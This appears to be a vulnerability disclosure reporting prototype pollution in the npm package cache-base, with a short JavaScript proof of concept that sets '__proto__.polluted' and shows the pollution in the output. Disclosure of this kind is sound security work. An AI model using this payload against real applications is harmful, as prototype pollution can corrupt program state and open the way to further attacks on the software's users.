# Description

`cache-base` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var cacheBase = require("cache-base")
const app = new cacheBase();
app.set('__proto__.polluted', 'Yes! Its Polluted');
console.log(app.get('polluted'));
```


2. Execute the following commands in terminal:

```
npm i cache-base # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Yes! Its Polluted
```
